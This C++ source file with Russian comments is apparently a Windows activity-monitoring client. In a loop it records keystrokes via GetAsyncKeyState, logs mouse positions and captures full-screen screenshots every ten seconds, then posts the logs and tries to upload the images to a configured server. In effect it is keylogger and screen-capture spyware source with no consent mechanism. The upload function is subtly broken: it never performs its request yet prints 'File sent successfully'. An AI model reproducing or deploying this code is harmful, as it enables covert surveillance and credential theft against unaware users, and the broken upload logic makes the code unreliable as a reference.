#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <fstream>
#include <sstream>
#include <windows.h>
#include <gdiplus.h>
#include <curl/curl.h>
#include <string>
#include <thread>

#pragma comment(lib, "gdiplus.lib")
using namespace Gdiplus;

// Глобальные переменные для хранения текущих состоянии
std::stringstream keyboardLog;
std::stringstream mouseLog;

std::string server_url = "http://localhost:5000";
std::string client_id = "MaksVit"; // ID клиента (указать собственный)
// Произвольный путь к папке скриншотов (заменить на собственный)
std::string screenshotFolder = "C:\\Users\\MaksimVitalyevich\\Documents\\Python Projects\\screenshots\\";
std::string screenshotFileName = "screenshot_" + client_id + ".bmp"; // формирование имени скриншота с ID клиента
std::string screenshotPath = screenshotFolder + screenshotFileName; // путь к папке со скриншотами

ULONG_PTR gdiplusToken;
std::atomic<bool> keepRunning(true);

void InitializeGDIPlus()
{
    GdiplusStartupInput gdiplusStartupInput;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
}

size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp)
{
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
{
    UINT num = 0;
    UINT size = 0;

    GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;

    ImageCodecInfo* pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL) return -1;

    GetImageEncoders(num, size, pImageCodecInfo);
    for (UINT j = 0; j < num; ++j)
    {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
        {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }
    free(pImageCodecInfo);
    return -1;
}

// Функция для захвата снимка экрана и сохранения в файл
void CaptureScreen(const std::string& client_id) {
    // Заменить на собственный путь к нахождению папки скриншотов

    std::wstring wScreenshotPath(screenshotPath.begin(), screenshotPath.end());
    // Размеры экрана
    int screenX = GetSystemMetrics(SM_CXSCREEN);
    int screenY = GetSystemMetrics(SM_CYSCREEN);

    // Создание устройства контекста
    HDC hScreenDC = CreateDC(TEXT("DISPLAY"), NULL, NULL, NULL);
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);

    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, screenX, screenY);
    SelectObject(hMemoryDC, hBitmap);

    // Копирование данных с экрана в битмап
    BitBlt(hMemoryDC, 0, 0, screenX, screenY, hScreenDC, 0, 0, SRCCOPY);

    // Создание GDI+ Bitmap из HBITMAP
    Bitmap bitmap(hBitmap, NULL);

    // Сохранение Bitmap в файл
    CLSID clsid;
    if (GetEncoderClsid(L"image/bmp", &clsid) == -1) {
        std::cerr << "Failed to get encoder CLSID." << std::endl;
        return;
    }
    if (bitmap.Save(wScreenshotPath.c_str(), &clsid, NULL) != Ok) {
        std::cerr << "Failed to save screenshot." << std::endl;
    }
    else {
        std::cout << " Screenshot captured and saved as " << screenshotPath << std::endl;
    }

    // Освобождение ресурсов
    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    DeleteDC(hScreenDC);
}

void MonitorKeyboard()
{
    for (int key = 8; key <= 190; ++key)
    {
        if (GetAsyncKeyState(key) & 0x8000)
        {
            keyboardLog << "Key: " << key << " pressed.\n";
        }
    }
}

void MonitorMouse()
{
    POINT p;
    if (GetCursorPos(&p))
    {
        mouseLog << "Mouse at: (" << p.x << ", " << p.y << ")\n";
    }
}

void SendDataToServer(const std::string& endpoint, const std::string& data)
{
    CURL* curl;
    CURLcode res = CURLE_OK;

    curl_global_init(CURL_GLOBAL_ALL);
    curl = curl_easy_init();
    if (curl)
    {
        std::string url = server_url + endpoint;
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data.c_str());
        res = curl_easy_perform(curl);
        if (res != CURLE_OK)
        {
            std::cerr << "cURL error occured: " << curl_easy_strerror(res) << std::endl;
        }
        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();
}

void SendFileToServer(const std::string& endpoint, const std::string& file_path)
{
    CURL* curl;
    CURLcode res = CURLE_OK;
    curl_mime* form = nullptr;
    curl_mimepart* field = nullptr;

    curl_global_init(CURL_GLOBAL_ALL);
    curl = curl_easy_init();
    if (curl)
    {
        std::string url = server_url + endpoint;
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());

        form = curl_mime_init(curl);
        field = curl_mime_addpart(form);
        curl_mime_name(field, "file");
        curl_mime_filedata(field, file_path.c_str());

        curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);
        if (res != CURLE_OK)
        {
            std::cerr << "cURL error occured: " << curl_easy_strerror(res) << std::endl;
        }
        else
        {
            std::cout << " File sent successfully: " << file_path << std::endl;
        }
        curl_mime_free(form);
        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();
}

void GetUserActivity()
{
    CURL* curl;
    CURLcode res = CURLE_OK;
    std::string readBuffer;

    curl_global_init(CURL_GLOBAL_ALL);
    curl = curl_easy_init();
    if (curl)
    {
        std::string url = server_url + "/get_activity";
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
        res = curl_easy_perform(curl);
        if (res != CURLE_OK)
        {
            std::cerr << "cURL error occured: " << curl_easy_strerror(res) << std::endl;
        }
        else
        {
            std::cout << "Activity data: " << readBuffer << std::endl;
        }
        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();
}

void ServiceWorkerThread()
{
    InitializeGDIPlus();

    while (keepRunning)
    {
        // мониторим клавиатуру
        MonitorKeyboard();
        // мониторим мышь
        MonitorMouse();
        // делаем снимки экрана
        CaptureScreen("MaksVit");
        // отправляем данные на сервер (мышь и клавиатура)
        SendDataToServer("/keyboard_activity", keyboardLog.str());
        SendDataToServer("/mouse_activity", mouseLog.str());
        // отправляем скриншоты на сервер
        SendFileToServer("/screenshot", screenshotPath);

        // очистка журналов активности
        keyboardLog.str("");
        mouseLog.str("");
        Sleep(10000); // задержка отправки данных на каждые 10 секунд
    }

    // Завершение работы GDI+
    GdiplusShutdown(gdiplusToken);
}

int main()
{
    ServiceWorkerThread();
    return 0;
}